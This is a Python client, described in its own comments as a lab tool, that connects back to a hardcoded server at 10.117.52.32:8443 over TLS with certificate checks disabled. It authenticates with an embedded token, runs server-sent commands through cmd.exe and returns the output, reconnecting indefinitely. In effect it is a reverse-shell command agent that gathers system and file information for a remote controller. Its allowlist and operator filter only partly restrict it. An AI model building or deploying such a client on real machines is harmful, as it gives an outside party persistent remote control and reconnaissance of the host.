import socket
import ssl
import json
import subprocess
import datetime
import os
import time
import shlex

SERVER_HOST = "10.117.52.32"
SERVER_PORT = 8443
AUTH_TOKEN = "fSwscUi04xXkA9bP7PxT5jThHPwqzCyhWpIgPBSN17Q"

LOG_FILE = "client.log"
RECONNECT_DELAY = 5
MAX_RECONNECT_DELAY = 60

# Controlled lab command set.
ALLOWED = {
    "whoami", "hostname", "ipconfig", "ver",
    "dir", "type", "echo", "ping", "tasklist",
    "systeminfo", "cd"
}


def log(message):
    try:
        with open(LOG_FILE, "a", encoding="utf-8") as f:
            f.write(f"[{datetime.datetime.now().isoformat()}] {message}\n")
    except Exception:
        pass


def send_json(sock, obj):
    data = json.dumps(obj).encode()
    sock.sendall(len(data).to_bytes(4, "big") + data)


def receive_json(sock):
    header = b""
    while len(header) < 4:
        part = sock.recv(4 - len(header))
        if not part:
            return None
        header += part

    size = int.from_bytes(header, "big")
    if size <= 0 or size > 4 * 1024 * 1024:
        raise ValueError("Invalid message size")

    data = b""
    while len(data) < size:
        part = sock.recv(size - len(data))
        if not part:
            raise ConnectionError("Connection lost")
        data += part

    return json.loads(data.decode())


def command_name(command):
    try:
        # Parse only to identify the first command; the complete command
        # is retained for execution after validation.
        parts = shlex.split(command, posix=False)
        return parts[0].lower() if parts else ""
    except ValueError:
        return ""


def valid_command(command):
    name = command_name(command)
    if name not in ALLOWED:
        return False

    # Permit common cmd.exe operators only for the controlled command set.
    # Block command substitution/chaining that could introduce another
    # command outside the allowlist.
    forbidden = ["&&", "||", ";", "&", "|", "<"]
    return not any(x in command for x in forbidden)


def change_directory(command, cwd):
    parts = command.strip().split(maxsplit=1)

    if len(parts) == 1:
        target = os.path.expanduser("~")
    else:
        target = parts[1].strip().strip('"')

    if target.lower().startswith("/d "):
        target = target[3:].strip().strip('"')

    if not os.path.isabs(target):
        target = os.path.join(cwd, target)

    target = os.path.abspath(os.path.normpath(target))

    if not os.path.isdir(target):
        return f"The system cannot find the path specified: {target}", cwd

    return target, target


def execute(command, cwd):
    name = command_name(command)

    if not valid_command(command):
        return "ERROR: Command is not permitted by the lab allowlist.", cwd

    if name == "cd":
        return change_directory(command, cwd)

    try:
        result = subprocess.run(
            ["cmd.exe", "/d", "/s", "/c", command],
            cwd=cwd,
            capture_output=True,
            text=True,
            timeout=20
        )

        output = result.stdout
        if result.stderr:
            output += result.stderr

        return output, cwd

    except subprocess.TimeoutExpired:
        return "ERROR: Command timed out.", cwd
    except Exception as e:
        return f"ERROR: {e}", cwd


def connect():
    ctx = ssl.create_default_context()
    # Self-signed certificate for isolated lab use.
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE

    raw = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw.settimeout(20)

    sock = ctx.wrap_socket(
        raw,
        server_hostname="SecureRemoteCLI"
    )
    sock.connect((SERVER_HOST, SERVER_PORT))
    sock.settimeout(None)

    request = receive_json(sock)
    if not request or request.get("type") != "auth_request":
        raise ConnectionError("Invalid authentication request")

    send_json(sock, {
        "type": "auth",
        "token": AUTH_TOKEN
    })

    response = receive_json(sock)
    if not response or response.get("status") != "success":
        raise PermissionError("Authentication failed")

    log("Connected and authenticated")
    return sock


def session(sock, cwd):
    while True:
        message = receive_json(sock)

        if not message:
            raise ConnectionError("Server disconnected")

        if message.get("type") != "command":
            continue

        command = str(message.get("command", "")).strip()

        if command.lower() == "exit":
            return cwd, False

        log(f"COMMAND: {command}")

        output, cwd = execute(command, cwd)

        log(f"OUTPUT: {output[:4000]}")

        send_json(sock, {
            "type": "result",
            "output": output,
            "cwd": cwd
        })


def main():
    cwd = os.getcwd()
    delay = RECONNECT_DELAY

    print("[*] Lab client started")

    while True:
        sock = None

        try:
            sock = connect()
            delay = RECONNECT_DELAY

            print(f"[+] Connected. cwd={cwd}")

            cwd, reconnect = session(sock, cwd)

            if not reconnect:
                break

        except KeyboardInterrupt:
            print("\n[*] Client stopped.")
            break

        except Exception as e:
            log(f"CONNECTION ERROR: {e}")
            print(f"[!] Connection lost: {e}")
            print(f"[*] Reconnecting in {delay}s...")
            time.sleep(delay)
            delay = min(delay * 2, MAX_RECONNECT_DELAY)

        finally:
            if sock:
                try:
                    sock.close()
                except Exception:
                    pass


if __name__ == "__main__":
    main()
